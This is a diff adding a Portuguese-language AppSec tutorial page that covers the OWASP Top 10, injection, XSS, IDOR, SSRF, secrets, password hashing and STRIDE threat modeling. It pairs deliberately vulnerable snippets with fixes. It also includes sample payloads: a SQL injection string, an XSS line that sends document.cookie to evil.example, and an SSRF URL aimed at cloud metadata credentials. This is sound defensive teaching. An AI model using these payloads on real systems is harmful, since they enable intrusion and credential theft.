@@ -1,0 +1,277 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Segurança de aplicações (AppSec) · Trilha Sec</title>
+<meta name="description" content="AppSec para quem já programa: OWASP Top 10, SQL injection, XSS, IDOR, SSRF, segredos, autenticação, threat modeling com STRIDE e checklist de code review seguro.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;600&family=Source+Serif+4:opsz,wght@8..60,400;8..60,600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<nav class="top"><a class="brand" href="./">▲ trilha-sec</a><span><a href="./#mapa">mapa</a> · <a href="06-certificacoes.html">certificações</a> · <a href="https://github.com/ogatalars/trilha-sec">github</a></span></nav>
+<main>
+  <span class="chip">◆ Parte 1 · Essencial · 03</span>
+  <h1>Segurança de aplicações (AppSec)</h1>
+  <p class="lead">Ao fim desta página você vai reconhecer as falhas mais comuns em código web, saber corrigi-las e saber pensar em ameaças antes de escrever a primeira linha.</p>
+
+  <h2 id="o-que-e">O que é AppSec</h2>
+  <p><dfn>AppSec</dfn> (de <em>Application Security</em>, segurança de aplicações) é a área que cuida para que o software que a empresa escreve não possa ser usado contra ela. Não é sobre firewall nem antivírus: é sobre o código, o desenho da aplicação e as dependências que ela puxa.</p>
+  <p>Na prática, quem trabalha com AppSec faz quatro coisas: revisa código e arquitetura atrás de falhas, ensina o time de desenvolvimento a evitá-las, escolhe e opera ferramentas que acham falhas automaticamente (isso é a próxima página, DevSecOps) e ajuda a corrigir quando algo é encontrado, seja por um scanner, por um pesquisador externo ou por um incidente.</p>
+  <p>Dois termos aparecem o tempo todo. Uma <dfn>vulnerabilidade</dfn> é um defeito que permite a alguém fazer o que não deveria: ler dados de outro usuário, executar comandos, derrubar o serviço. Um <dfn>exploit</dfn> é a forma concreta de aproveitar essa vulnerabilidade, como a requisição HTTP específica que dispara o defeito.</p>
+
+  <div class="callout dev">
+    <span class="callout-title">Por que isso importa para quem vem de dev</span>
+    <p>AppSec é a porta de entrada mais natural para quem programa. Você já lê pull requests, já entende como um request vira query no banco, já sabe o que é um ORM e um template. A diferença é a pergunta que você faz ao ler o código: em vez de "isso funciona?", passa a ser "o que acontece se a entrada for maliciosa?". Times de AppSec contratam gente que sabe conversar com dev, porque a correção quase sempre é feita pelo dev, e convencer alguém a mudar código exige falar a língua dele.</p>
+  </div>
+
+  <h2 id="owasp">OWASP e o OWASP Top 10</h2>
+  <p>A <dfn>OWASP</dfn> (<em>Open Worldwide Application Security Project</em>) é uma fundação sem fins lucrativos que mantém material aberto sobre segurança de software: guias, ferramentas e listas de referência. É a fonte que todo mundo da área cita, e quase todo material dela é gratuito.</p>
+  <p>O produto mais famoso é o <dfn>OWASP Top 10</dfn>: um ranking das dez categorias de risco mais relevantes em aplicações web, montado a partir de dados de testes reais e de uma pesquisa com profissionais. Ele não é um padrão técnico completo; é um documento de conscientização, um "por onde começar". A edição atual é a de <strong>2025</strong> (publicada em novembro de 2025, substituindo a de 2021). Cada categoria agrupa várias <dfn>CWEs</dfn> (<em>Common Weakness Enumeration</em>, um catálogo público que dá um número a cada tipo de falha de software, por exemplo CWE-89 é SQL injection).</p>
+
+  <div class="table-wrap">
+  <table>
+    <thead><tr><th>Categoria (2025)</th><th>O que é</th><th>Exemplo</th></tr></thead>
+    <tbody>
+      <tr><td>A01 Broken Access Control</td><td>O sistema não verifica direito se quem pede tem permissão para aquilo. Na edição 2025 inclui SSRF.</td><td><code>GET /api/faturas/1002</code> devolve a fatura de outro cliente.</td></tr>
+      <tr><td>A02 Security Misconfiguration</td><td>Configuração insegura: padrões de fábrica, debug ligado, permissões abertas.</td><td>Bucket de armazenamento público; stack trace com credencial na página de erro.</td></tr>
+      <tr><td>A03 Software Supply Chain Failures</td><td>Riscos vindos de dependências, ferramentas de build e distribuição do software.</td><td>Biblioteca npm comprometida que rouba variáveis de ambiente no <code>postinstall</code>.</td></tr>
+      <tr><td>A04 Cryptographic Failures</td><td>Dados sensíveis sem criptografia ou com criptografia fraca.</td><td>Senhas guardadas em MD5; tráfego interno com dados de cartão em HTTP puro.</td></tr>
+      <tr><td>A05 Injection</td><td>Entrada do usuário é interpretada como código ou comando (SQL, shell, XSS).</td><td><code>"SELECT ... WHERE nome = '" + nome + "'"</code>.</td></tr>
+      <tr><td>A06 Insecure Design</td><td>Falha no desenho, não na implementação: o fluxo em si é inseguro.</td><td>Recuperação de senha por "pergunta secreta" cuja resposta está no LinkedIn.</td></tr>
+      <tr><td>A07 Authentication Failures</td><td>Falhas em provar quem o usuário é: login, sessão, MFA.</td><td>Login sem limite de tentativas; token de sessão que nunca expira.</td></tr>
+      <tr><td>A08 Software or Data Integrity Failures</td><td>Confiar em código ou dados sem verificar se foram adulterados.</td><td>Desserializar objeto vindo do cliente; atualização automática sem assinatura.</td></tr>
+      <tr><td>A09 Security Logging &amp; Alerting Failures</td><td>Não registrar eventos importantes ou não alertar sobre eles.</td><td>Ninguém percebe 50 mil tentativas de login numa madrugada.</td></tr>
+      <tr><td>A10 Mishandling of Exceptional Conditions</td><td>Tratamento ruim de erros e situações anormais (nova em 2025).</td><td>Exceção no meio da checagem de permissão faz o código seguir em frente como se tivesse passado ("fail open").</td></tr>
+    </tbody>
+  </table>
+  </div>
+
+  <div class="callout warn">
+    <span class="callout-title">Armadilha comum</span>
+    <p>Muito material na internet (e muita vaga) ainda cita a edição de 2021, em que a ordem era diferente: Injection era A03, SSRF tinha categoria própria (A10) e "Vulnerable and Outdated Components" era A06. Quando alguém disser "A03", pergunte de qual edição. E não trate o Top 10 como checklist completo: passar nele não significa que a aplicação é segura.</p>
+  </div>
+
+  <h2 id="injection">SQL injection</h2>
+  <p><dfn>SQL injection</dfn> (SQLi) acontece quando dados do usuário são concatenados dentro de uma query SQL, e o banco passa a interpretar parte desses dados como comando. É uma falha antiga, mas ainda aparece em código novo, especialmente em queries "rápidas" escritas à mão fora do ORM.</p>
+<pre><code><span class="c"># Python + sqlite3 / psycopg: VULNERÁVEL</span>
+<span class="bad">def buscar_usuario(email):
+    sql = f"SELECT id, nome FROM usuarios WHERE email = '{email}'"
+    return db.execute(sql).fetchall()</span>
+
+<span class="c"># Entrada maliciosa:  ' OR '1'='1
+# Query resultante:   SELECT id, nome FROM usuarios WHERE email = '' OR '1'='1'
+# Resultado: devolve TODOS os usuários.</span></code></pre>
+  <p>A correção é a <dfn>query parametrizada</dfn> (também chamada de <em>prepared statement</em>): você manda o texto da query e os valores separadamente para o driver do banco. O banco compila a query primeiro e só depois encaixa os valores, que são tratados sempre como dado, nunca como SQL.</p>
+<pre><code><span class="ok">def buscar_usuario(email):
+    sql = "SELECT id, nome FROM usuarios WHERE email = %s"   <span class="c"># placeholder</span>
+    return db.execute(sql, (email,)).fetchall()             <span class="c"># valor separado</span></span>
+
+<span class="c">// Node + pg: mesma ideia</span>
+<span class="ok">await pool.query("SELECT id, nome FROM usuarios WHERE email = $1", [email]);</span></code></pre>
+  <p>Por que isso resolve e "escapar aspas" não? Porque escapar à mão depende de você lembrar todos os casos (codificação de caracteres, contextos numéricos sem aspas, nomes de coluna). A parametrização elimina a classe inteira de bug no ponto certo: na fronteira entre código e dado.</p>
+  <div class="callout dev">
+    <span class="callout-title">Ponte com o que você já faz</span>
+    <p>ORMs como SQLAlchemy, Django ORM, Prisma e TypeORM parametrizam por padrão. O risco volta quando você usa as "saídas de emergência": <code>raw()</code>, <code>text()</code>, <code>$queryRawUnsafe</code>, ou interpola nome de coluna para um <code>ORDER BY</code> dinâmico. Nome de coluna não pode ser parâmetro; nesses casos, compare com uma lista fixa de colunas permitidas.</p>
+  </div>
+  <p>O mesmo raciocínio vale para outras injeções: <dfn>command injection</dfn> (montar um comando de shell com entrada do usuário, como <code>os.system("convert " + arquivo)</code>; a correção é passar argumentos como lista, <code>subprocess.run(["convert", arquivo])</code>, sem <code>shell=True</code>) e injeção em LDAP, NoSQL ou templates.</p>
+
+  <h2 id="xss">XSS (Cross-Site Scripting)</h2>
+  <p><dfn>XSS</dfn> (<em>Cross-Site Scripting</em>) é injeção, só que no navegador: a aplicação coloca dado do usuário dentro do HTML sem tratar, e esse dado vira JavaScript executando na página de outra pessoa. Com isso o atacante pode agir como a vítima: ler dados da tela, fazer requisições autenticadas em nome dela, trocar o e-mail da conta.</p>
+  <p>Existem três variações: <strong>armazenado</strong> (o script fica salvo no banco, por exemplo num comentário, e roda para todo mundo que abre a página), <strong>refletido</strong> (vem num parâmetro da URL e volta na resposta) e <strong>baseado em DOM</strong> (o próprio JavaScript do front lê algo da URL e escreve na página).</p>
+<pre><code><span class="c">// Express: VULNERÁVEL (XSS refletido)</span>
+<span class="bad">app.get("/busca", (req, res) =&gt; {
+  res.send(`&lt;h1&gt;Resultados para ${req.query.q}&lt;/h1&gt;`);
+});</span>
+<span class="c">// /busca?q=&lt;script&gt;fetch('https://evil.example/?c='+document.cookie)&lt;/script&gt;</span>
+
+<span class="c">// Front-end: VULNERÁVEL (XSS DOM)</span>
+<span class="bad">el.innerHTML = comentario.texto;</span>
+
+<span class="c">// CORRIGIDO: deixar o template/framework escapar</span>
+<span class="ok">res.render("busca", { q: req.query.q });   // EJS com &lt;%= q %&gt; escapa
+el.textContent = comentario.texto;          // texto, não HTML</span></code></pre>
+  <p>A defesa principal é o <dfn>output encoding</dfn> (codificação de saída, também dito "escapar"): transformar caracteres especiais no contexto de destino, como <code>&lt;</code> em <code>&amp;lt;</code> dentro de HTML. React, Vue, Angular, Jinja2 e os templates do Django já fazem isso por padrão. O risco aparece quando alguém desliga a proteção: <code>dangerouslySetInnerHTML</code>, <code>v-html</code>, <code>|safe</code>, <code>innerHTML</code>. Se você realmente precisa renderizar HTML vindo do usuário (um editor rico, por exemplo), passe por um sanitizador como o DOMPurify.</p>
+  <p>A segunda camada é a <dfn>CSP</dfn> (<em>Content Security Policy</em>): um cabeçalho HTTP que diz ao navegador de onde scripts podem ser carregados. Mesmo que um XSS escape, uma CSP bem feita impede o script injetado de rodar.</p>
+<pre><code>Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'</code></pre>
+  <p>Esse cabeçalho bloqueia scripts inline e de domínios externos. Também ajuda marcar o cookie de sessão como <code>HttpOnly</code> (o JavaScript não consegue lê-lo) e <code>Secure</code> (só trafega por HTTPS). Note que isso é <dfn>defesa em profundidade</dfn>: várias camadas independentes, para que a falha de uma não seja suficiente para o ataque.</p>
+
+  <h2 id="idor">Broken access control e IDOR</h2>
+  <p>Esta é a categoria número 1 do Top 10, e a mais comum em APIs. Primeiro, duas palavras que se confundem: <dfn>autenticação</dfn> é provar quem você é (login); <dfn>autorização</dfn> é decidir o que você pode fazer depois de provado. A maioria das APIs acerta a autenticação e esquece a autorização objeto por objeto.</p>
+  <p><dfn>IDOR</dfn> (<em>Insecure Direct Object Reference</em>, referência direta insegura a objeto) é o caso clássico: a API recebe um ID e devolve o objeto sem verificar se ele pertence a quem pediu. Em contexto de API, a OWASP chama a mesma coisa de <dfn>BOLA</dfn> (<em>Broken Object Level Authorization</em>).</p>
+<pre><code><span class="c"># FastAPI: VULNERÁVEL — qualquer usuário logado lê qualquer pedido</span>
+<span class="bad">@app.get("/pedidos/{pedido_id}")
+def ver_pedido(pedido_id: int, user = Depends(usuario_logado)):
+    return db.get(Pedido, pedido_id)</span>
+
+<span class="c"># CORRIGIDO — a posse é verificada no servidor, na própria query</span>
+<span class="ok">@app.get("/pedidos/{pedido_id}")
+def ver_pedido(pedido_id: int, user = Depends(usuario_logado)):
+    pedido = db.query(Pedido).filter_by(id=pedido_id, dono_id=user.id).first()
+    if pedido is None:
+        raise HTTPException(status_code=404)   <span class="c"># 404, não 403: não confirma que existe</span>
+    return pedido</span></code></pre>
+  <div class="callout warn">
+    <span class="callout-title">Armadilha comum</span>
+    <p>"Mas o front só mostra os pedidos do próprio usuário." Não importa: o atacante não usa o seu front, usa <code>curl</code> ou um proxy como o Burp Suite. Esconder botão não é controle de acesso. Trocar IDs sequenciais por UUID dificulta adivinhar, mas também não é controle de acesso; a checagem de posse no servidor continua obrigatória.</p>
+  </div>
+  <p>Outras variações: <strong>escalada vertical</strong> (usuário comum chamando <code>DELETE /admin/usuarios/7</code> porque a rota só checa se está logado) e <dfn>mass assignment</dfn> (o endpoint aceita o corpo JSON inteiro e grava no modelo, então o usuário manda <code>"is_admin": true</code> junto). A correção do segundo é declarar explicitamente os campos aceitos, com um schema (Pydantic, Zod) por endpoint.</p>
+
+  <h2 id="ssrf">SSRF (Server-Side Request Forgery)</h2>
+  <p><dfn>SSRF</dfn> acontece quando a aplicação faz uma requisição HTTP para uma URL controlada pelo usuário. O atacante não consegue acessar a rede interna da empresa diretamente, mas o seu servidor consegue, e ele usa o servidor como intermediário. Funcionalidades típicas: "importar imagem por URL", webhooks, gerador de preview de link, conversor de HTML para PDF.</p>
+  <p>O alvo mais valioso em nuvem é o <dfn>metadata endpoint</dfn>: um endereço especial, <code>http://169.254.169.254/</code>, que AWS, GCP e Azure expõem para cada máquina virtual consultar informações sobre si mesma, incluindo, em várias configurações, credenciais temporárias da conta de serviço. Foi um SSRF contra esse endpoint que levou ao vazamento da Capital One em 2019.</p>
+<pre><code><span class="c"># VULNERÁVEL</span>
+<span class="bad">@app.post("/avatar-por-url")
+def avatar(url: str):
+    img = requests.get(url, timeout=5).content
+    salvar(img)</span>
+<span class="c"># url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"</span>
+
+<span class="c"># MELHOR: allowlist de destino + bloqueio de IPs internos</span>
+<span class="ok">import ipaddress, socket
+from urllib.parse import urlparse
+
+HOSTS_PERMITIDOS = {"images.parceiro.com", "cdn.parceiro.com"}
+
+def validar_url(url: str) -&gt; str:
+    u = urlparse(url)
+    if u.scheme != "https" or u.hostname not in HOSTS_PERMITIDOS:
+        raise ValueError("destino não permitido")
+    for info in socket.getaddrinfo(u.hostname, 443):
+        ip = ipaddress.ip_address(info[4][0])
+        if ip.is_private or ip.is_loopback or ip.is_link_local:
+            raise ValueError("destino interno")
+    return url
+
+img = requests.get(validar_url(url), timeout=5, allow_redirects=False).content</span></code></pre>
+  <p>Por que tantas checagens? Uma <dfn>allowlist</dfn> (lista do que é permitido; tudo fora dela é negado) é muito mais forte que uma <dfn>denylist</dfn> (lista do que é proibido), porque o atacante tem infinitas formas de escrever um IP interno: <code>0x7f000001</code>, <code>[::ffff:127.0.0.1]</code>, um domínio dele que resolve para <code>10.0.0.5</code>. Desligar redirects impede que um host permitido redirecione para o interno. Uma brecha que ainda sobra é o <em>DNS rebinding</em> (o DNS responde um IP na validação e outro na requisição); a proteção completa é fixar o IP resolvido na conexão ou fazer as requisições saírem por um proxy de egress isolado. Na nuvem, exija o IMDSv2 da AWS (o metadata exige um token obtido por PUT, o que barra a maioria dos SSRF simples).</p>
+
+  <h2 id="deserializacao">Desserialização insegura (breve)</h2>
+  <p><dfn>Serializar</dfn> é transformar um objeto em bytes para guardar ou transmitir; <dfn>desserializar</dfn> é o caminho inverso. Alguns formatos guardam não só dados, mas instruções de como reconstruir objetos, e isso permite executar código durante a desserialização. Em Python, <code>pickle.loads()</code> de dado vindo de fora é execução remota de código garantida; o mesmo vale para <code>yaml.load()</code> sem <code>SafeLoader</code>, <code>ObjectInputStream</code> em Java e <code>unserialize()</code> em PHP.</p>
+<pre><code><span class="bad">dados = pickle.loads(request.cookies["carrinho"])   <span class="c"># RCE</span></span>
+<span class="ok">dados = json.loads(request.cookies["carrinho"])     <span class="c"># JSON só carrega dados</span>
+cfg = yaml.safe_load(arquivo)</span></code></pre>
+  <p>Regra prática: para dados que cruzam uma fronteira de confiança, use formatos que só representam dados (JSON, Protobuf) e valide o resultado contra um schema. Se precisar garantir que o dado não foi alterado no cliente, assine-o (HMAC, um código de autenticação calculado com uma chave secreta do servidor).</p>
+
+  <h2 id="segredos">Segredos no código</h2>
+  <p>Um <dfn>segredo</dfn> é qualquer valor que dá acesso a algo: senha de banco, chave de API, token de serviço, chave privada. Colocá-los no código-fonte é um dos incidentes mais comuns, e o problema é que o git nunca esquece: apagar a linha num commit novo não remove do histórico.</p>
+<pre><code><span class="bad">STRIPE_KEY = "sk_live_51H...xyz"   <span class="c"># vai para todo clone, fork e backup</span></span>
+<span class="ok">STRIPE_KEY = os.environ["STRIPE_KEY"]   <span class="c"># injetado pelo ambiente ou por um cofre</span></span></code></pre>
+  <p>Onde guardar: variáveis de ambiente injetadas pela plataforma, ou um <dfn>secret manager</dfn> (cofre de segredos, como AWS Secrets Manager, GCP Secret Manager ou HashiCorp Vault, que guarda, controla acesso e registra quem leu cada segredo). Se um segredo vazar, a resposta correta é <strong>revogar e gerar outro</strong> (rotacionar) primeiro, e só depois limpar o histórico. Robôs varrem o GitHub público e testam chaves em minutos. Detectar segredos antes do push é assunto da próxima página.</p>
+
+  <h2 id="autenticacao">Armadilhas de autenticação</h2>
+  <h3>Armazenamento de senha</h3>
+  <p>Nunca guarde senha em texto puro, nem com criptografia reversível, nem com hash rápido (MD5, SHA-1, SHA-256 puro). Um <dfn>hash</dfn> é uma função de mão única: transforma a senha num valor fixo do qual não dá para voltar. O problema dos hashes rápidos é justamente serem rápidos: uma GPU testa bilhões de SHA-256 por segundo, então um banco vazado é quebrado por força bruta. Use um algoritmo feito para senha, que é lento de propósito e usa <dfn>salt</dfn> (um valor aleatório por usuário, misturado à senha, para que duas senhas iguais gerem hashes diferentes): <strong>Argon2id</strong> (recomendação atual da OWASP), bcrypt ou scrypt.</p>
+<pre><code><span class="bad">hash = hashlib.sha256(senha.encode()).hexdigest()</span>
+
+<span class="ok">from argon2 import PasswordHasher   <span class="c"># pip install argon2-cffi</span>
+ph = PasswordHasher()
+hash = ph.hash(senha)           <span class="c"># salt incluso no resultado</span>
+ph.verify(hash, tentativa)      <span class="c"># lança exceção se não bater</span></span></code></pre>
+  <h3>Rate limit e força bruta</h3>
+  <p>Sem limite de tentativas, o login vira alvo de <dfn>credential stuffing</dfn>: o atacante pega listas de e-mail e senha vazadas de outros sites e testa em massa, contando que as pessoas repetem senha. A defesa é <dfn>rate limiting</dfn> (limitar quantas requisições um cliente faz por janela de tempo) por IP e por conta, bloqueio progressivo, CAPTCHA depois de algumas falhas e, principalmente, <dfn>MFA</dfn> (<em>Multi-Factor Authentication</em>, pedir um segundo fator além da senha, como um app autenticador ou chave física).</p>
+  <h3>Outros cuidados</h3>
+  <ul>
+    <li><strong>Mensagens de erro iguais</strong> para "usuário não existe" e "senha errada", para não permitir descobrir quais e-mails têm conta (<em>user enumeration</em>). Vale também para "esqueci minha senha".</li>
+    <li><strong>Sessão</strong>: gere um novo ID de sessão após o login, defina expiração e invalide no logout.</li>
+    <li><strong>JWT</strong> (<em>JSON Web Token</em>, token assinado que carrega dados do usuário): valide a assinatura com o algoritmo fixado no servidor, nunca aceite <code>alg: none</code> e lembre que o conteúdo é apenas codificado em base64, não criptografado.</li>
+    <li><strong>Não invente</strong>: prefira a biblioteca de autenticação do framework ou um provedor de identidade a escrever o seu fluxo de login.</li>
+  </ul>
+
+  <h2 id="validacao">Validação de entrada vs codificação de saída</h2>
+  <p>Estas duas ideias se confundem, e a confusão gera bug.</p>
+  <ul>
+    <li><dfn>Validação de entrada</dfn>: na chegada do dado, verificar se ele tem o formato esperado e rejeitar o que não tem. Um CEP tem 8 dígitos; uma quantidade é inteiro entre 1 e 99; um status pertence a um enum. Serve para manter a regra de negócio íntegra e reduzir a superfície de ataque.</li>
+    <li><dfn>Codificação de saída</dfn>: no momento de usar o dado num contexto que interpreta texto (HTML, SQL, shell, URL), transformá-lo para que seja tratado como dado nesse contexto.</li>
+  </ul>
+  <p>Por que precisa das duas? Porque validação sozinha não protege um campo de texto livre. O nome "O'Brien" é válido e tem aspas; um comentário pode legitimamente conter <code>&lt;</code>. Você não pode recusar esses valores, mas precisa codificá-los na saída. E o mesmo dado vai para contextos diferentes (HTML, JSON, CSV, SQL), cada um com sua codificação, que só é conhecida no ponto de uso. Resumo: <strong>valide na entrada pelo negócio, codifique na saída pelo contexto</strong>, e prefira validar com allowlist (o que é aceito) a denylist (o que é proibido).</p>
+<pre><code><span class="c"># Pydantic: validação declarativa na fronteira</span>
+<span class="ok">class NovoPedido(BaseModel):
+    produto_id: int = Field(gt=0)
+    quantidade: int = Field(ge=1, le=99)
+    cep: str = Field(pattern=r"^\d{8}$")
+    model_config = ConfigDict(extra="forbid")   <span class="c"># rejeita campos extras (mass assignment)</span></span></code></pre>
+
+  <h2 id="threat-modeling">Threat modeling com STRIDE</h2>
+  <p><dfn>Threat modeling</dfn> (modelagem de ameaças) é pensar, antes ou durante o design, no que pode dar errado com um sistema e o que fazer a respeito. É barato: uma hora com o time e um quadro branco evita falhas que custariam semanas para corrigir depois, porque falha de desenho (A06) não se resolve com um patch pontual.</p>
+  <p>O processo cabe em quatro perguntas, popularizadas por Adam Shostack: <em>O que estamos construindo? O que pode dar errado? O que vamos fazer a respeito? Fizemos um bom trabalho?</em></p>
+  <p>Para responder a primeira, desenhe um <dfn>diagrama de fluxo de dados</dfn> (DFD): caixas para os componentes, setas para os dados que passam entre eles e linhas tracejadas para as <dfn>fronteiras de confiança</dfn>, pontos onde o dado muda de "nível de confiança", como da internet para a sua API, ou da API para um serviço de terceiro. A maior parte das ameaças vive nas setas que cruzam essas fronteiras.</p>
+  <p>Para a segunda, use o <dfn>STRIDE</dfn>, um mnemônico criado na Microsoft com seis categorias de ameaça. Cada uma viola uma propriedade de segurança:</p>
+  <div class="table-wrap">
+  <table>
+    <thead><tr><th>Letra</th><th>Ameaça</th><th>Propriedade violada</th><th>Pergunta para fazer</th></tr></thead>
+    <tbody>
+      <tr><td>S</td><td>Spoofing (falsificação de identidade)</td><td>Autenticação</td><td>Alguém consegue se passar por outro usuário ou serviço?</td></tr>
+      <tr><td>T</td><td>Tampering (adulteração)</td><td>Integridade</td><td>Alguém consegue alterar dados em trânsito ou em repouso?</td></tr>
+      <tr><td>R</td><td>Repudiation (repúdio)</td><td>Não repúdio</td><td>Alguém consegue fazer algo e depois negar, por falta de registro?</td></tr>
+      <tr><td>I</td><td>Information disclosure (vazamento)</td><td>Confidencialidade</td><td>Alguém consegue ler o que não deveria?</td></tr>
+      <tr><td>D</td><td>Denial of service (negação de serviço)</td><td>Disponibilidade</td><td>Alguém consegue derrubar ou degradar o sistema?</td></tr>
+      <tr><td>E</td><td>Elevation of privilege (escalada de privilégio)</td><td>Autorização</td><td>Alguém consegue fazer algo acima da sua permissão?</td></tr>
+    </tbody>
+  </table>
+  </div>
+
+  <h3>Exemplo trabalhado: API de upload de documentos</h3>
+  <p>Sistema: usuários enviam PDFs de comprovante para uma API; ela grava num bucket de armazenamento de objetos e enfileira um job que gera uma miniatura; o usuário depois baixa o arquivo.</p>
+<pre><code>[Navegador] ──HTTPS: POST /uploads (JWT + arquivo)──▶ [API]
+- - - - - - - - - fronteira: internet ↔ sistema - - - - - - - - -
+[API] ──grava objeto──▶ [Bucket]      [API] ──mensagem──▶ [Fila]
+[Fila] ──▶ [Worker de miniatura] ──lê objeto──▶ [Bucket]
+[Navegador] ──GET /uploads/{id}──▶ [API] ──URL assinada──▶ [Navegador]</code></pre>
+  <p>Agora, passe o STRIDE em cada seta que cruza a fronteira:</p>
+  <div class="table-wrap">
+  <table>
+    <thead><tr><th>STRIDE</th><th>Ameaça concreta</th><th>Mitigação</th></tr></thead>
+    <tbody>
+      <tr><td>S</td><td>Token roubado ou forjado usado para enviar em nome de outro.</td><td>Validar assinatura e expiração do JWT; expiração curta.</td></tr>
+      <tr><td>T</td><td>Usuário envia um HTML ou SVG com script disfarçado de PDF; ou um nome de arquivo <code>../../etc/cron.d/x</code> (<em>path traversal</em>, sair do diretório esperado usando <code>../</code>).</td><td>Checar o tipo pelo conteúdo (magic bytes), não pela extensão; gerar o nome do objeto no servidor (UUID); servir com <code>Content-Disposition: attachment</code> de domínio separado.</td></tr>
+      <tr><td>R</td><td>Usuário apaga um comprovante e diz que nunca enviou.</td><td>Log de auditoria com quem, quando, hash do arquivo.</td></tr>
+      <tr><td>I</td><td><code>GET /uploads/{id}</code> devolve arquivo de outro usuário (IDOR); bucket público.</td><td>Checagem de posse; bucket privado; URL assinada com expiração de minutos.</td></tr>
+      <tr><td>D</td><td>Arquivo de 5 GB, ou PDF malicioso que trava o gerador de miniatura (<em>decompression bomb</em>).</td><td>Limite de tamanho no proxy e na API; rate limit por usuário; worker com timeout e limite de memória.</td></tr>
+      <tr><td>E</td><td>Falha no parser de PDF dá execução de código no worker, que tem permissão de escrita no bucket inteiro.</td><td>Worker isolado em container sem privilégios, só leitura nos originais, credencial com escopo mínimo; biblioteca de PDF atualizada.</td></tr>
+    </tbody>
+  </table>
+  </div>
+  <p>Repare no padrão: quase toda mitigação é algo que um dev já sabe implementar. O valor do exercício é a lista, que vira cards no backlog, critérios de aceite e casos de teste.</p>
+
+  <h2 id="code-review">Checklist de code review seguro</h2>
+  <p>Ao revisar um PR com olhar de segurança, siga o dado: de onde ele vem, por onde passa e onde é usado. Perguntas que pegam a maioria dos problemas:</p>
+  <ul>
+    <li><strong>Entrada</strong>: todo dado externo (body, query, header, cookie, arquivo, mensagem de fila, resposta de outra API) é validado com schema? Campos extras são rejeitados?</li>
+    <li><strong>Autorização</strong>: cada endpoint novo verifica permissão? Cada busca por ID filtra pelo dono ou tenant?</li>
+    <li><strong>Injeção</strong>: alguma string concatenada em SQL, shell, template, caminho de arquivo, LDAP ou regex?</li>
+    <li><strong>Saída</strong>: algum <code>innerHTML</code>, <code>dangerouslySetInnerHTML</code>, <code>|safe</code>, <code>v-html</code>?</li>
+    <li><strong>Requisições de saída</strong>: alguma URL vinda do usuário (SSRF)?</li>
+    <li><strong>Segredos</strong>: chave, senha ou token no código, nos testes, no log ou na mensagem de erro?</li>
+    <li><strong>Criptografia</strong>: algoritmo caseiro, MD5/SHA-1 para senha, <code>random</code> em vez de <code>secrets</code> para gerar token?</li>
+    <li><strong>Erros</strong>: exceção na checagem de permissão nega (fail closed) ou libera? Stack trace vai para o cliente?</li>
+    <li><strong>Logs</strong>: eventos de segurança (login, falha, troca de senha, ação administrativa) são registrados? Dado sensível (senha, token, CPF) fica fora do log?</li>
+    <li><strong>Dependências</strong>: biblioteca nova é mantida, popular e com nome correto (cuidado com <em>typosquatting</em>, pacotes com nome parecido de propósito, como <code>reqeusts</code>)?</li>
+  </ul>
+  <p>Para algo mais completo que este checklist existe o <dfn>OWASP ASVS</dfn> (<em>Application Security Verification Standard</em>): uma lista grande de requisitos verificáveis, organizada por área (autenticação, sessão, validação, criptografia...) e em três níveis de rigor. O nível 1 é o mínimo para qualquer aplicação; o 3 é para sistemas críticos. É útil como fonte de critérios de aceite ("este endpoint atende ASVS nível 2 em controle de acesso") e como roteiro de estudo. Para consulta rápida por tema, os <em>OWASP Cheat Sheets</em> são curtos e práticos.</p>
+
+  <h2 id="praticar">Onde praticar</h2>
+  <div class="grid">
+    <a class="card" href="https://portswigger.net/web-security"><span class="n">grátis</span><h3>PortSwigger Web Security Academy</h3><p>Do time que faz o Burp Suite. Teoria curta e centenas de laboratórios online por tema: SQLi, XSS, controle de acesso, SSRF, autenticação. Comece pelos laboratórios "Apprentice".</p></a>
+    <a class="card" href="https://owasp.org/www-project-juice-shop/"><span class="n">grátis · open source</span><h3>OWASP Juice Shop</h3><p>Uma loja online cheia de falhas de propósito, em Node e Angular. Rode com <code>docker run -p 3000:3000 bkimminich/juice-shop</code> e acompanhe os desafios no placar.</p></a>
+  </div>
+  <div class="callout warn">
+    <span class="callout-title">Armadilha comum</span>
+    <p>Teste só o que é seu ou o que foi feito para isso (laboratórios, programas de bug bounty dentro do escopo publicado). Testar o site de uma empresa sem autorização é crime em muitos países, incluindo o Brasil (Lei 12.737/2012), mesmo "só para ver se funciona".</p>
+  </div>
+  <p>Uma sugestão de ordem: faça os laboratórios de SQLi, XSS e Access Control na Academy; depois resolva os desafios de 1 e 2 estrelas do Juice Shop; por fim, pegue um projeto pessoal seu e faça o threat model e a revisão com o checklist acima. Esse último vira um ótimo texto para portfólio.</p>
+
+  <h2 id="checkpoint">Checkpoint</h2>
+  <details><summary>Por que query parametrizada resolve SQL injection melhor do que escapar aspas?</summary><p>Porque o texto da query e os valores chegam separados ao banco: a query é compilada antes, e o valor é sempre tratado como dado. Escapar à mão depende de cobrir todos os contextos e codificações, e um único esquecimento reabre a falha.</p></details>
+  <details><summary>Um endpoint <code>GET /contas/{id}</code> exige login. Isso basta? O que falta?</summary><p>Não basta. Login é autenticação; falta autorização no nível do objeto: verificar no servidor que a conta pertence ao usuário (ou ao tenant dele), idealmente filtrando na própria query. Sem isso, é IDOR/BOLA.</p></details>
+  <details><summary>Por que o endereço 169.254.169.254 aparece em quase todo relatório de SSRF em nuvem?</summary><p>É o metadata endpoint das VMs em AWS, GCP e Azure, que pode entregar credenciais temporárias da conta de serviço da máquina. Um SSRF que alcança esse endereço pode virar acesso à conta de nuvem. Mitigação: allowlist de destino, bloqueio de IPs internos e link-local, e IMDSv2 na AWS.</p></details>
+  <details><summary>Se a API já valida todas as entradas, ainda é preciso codificar a saída?</summary><p>Sim. Validação garante formato de negócio, mas dados legítimos podem conter caracteres perigosos (aspas, <code>&lt;</code>), e o mesmo dado vai para contextos diferentes. A codificação no ponto de uso, pelo contexto (HTML, SQL, shell), é o que impede injeção.</p></details>
